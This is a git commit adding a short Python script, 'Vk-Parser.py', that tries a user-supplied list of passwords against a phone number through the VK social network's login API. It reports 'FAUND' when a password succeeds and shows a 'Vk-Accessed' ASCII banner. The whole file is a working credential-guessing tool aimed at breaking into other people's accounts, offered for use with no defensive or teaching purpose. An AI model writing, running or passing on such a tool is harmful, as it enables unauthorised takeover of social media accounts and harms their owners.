97e674e622f106deb5daf8e80cfb0d96c8979729
SocialEnot <78096790+SocialEnot@users.noreply.github.com>
2021-02-22 13:17:19 +0500

    Add files via upload

---
+++ Vk-Parser.py
@@ -0,0 +1,48 @@
+import vk_api
+from colorama import init, Fore, Back, Style
+from playsound import *
+
+
+
+init()
+
+def console_picture():
+    print(Fore.YELLOW)
+    print("#################*:::---::-------%################")
+    print("################**::::------------%###############")
+    print("###############%**::::-------------###############")
+    print("###############***::::-------------:##############")
+    print("##############%***::::--------------%#############")
+    print("##############=***::::--------------*#############")
+    print("##########=*::=++**:::------------------*=@#######")
+    print("#####@=+****:::*+****:::::--------------------=###")
+    print("######%+****::::::---:::------------------.*@#####")
+    print("###########=*:::::--------------------.*@#########")
+    print("###############%*:-----------------*@#############")
+    print("###############@#####%+*:---:+%#####%#############")
+    print("############===%%%@##########@%==+**##############")
+    print("##############--:::::::*####***::---.+############")
+    print("################+-.....*####......:=##############")
+    print("##################################################")
+    print(Fore.GREEN + "Vk-Accessed")
+console_picture()
+
+
+print(Style.RESET_ALL)
+
+
+if __name__ == '__main__':
+    phone = input('phone: ')
+    words = list(map(str, input("words: ").split(', ')))
+    for password in words:
+        try:
+            vk_session = vk_api.VkApi(phone, str(password))
+            vk_session.auth()
+            print(Fore.GREEN + "FAUND: " + str(password))
+            break
+        except:
+            print(Fore.RED + str(password) + ' BAD')
+
+playsound('sound.mp3')
+
+input()
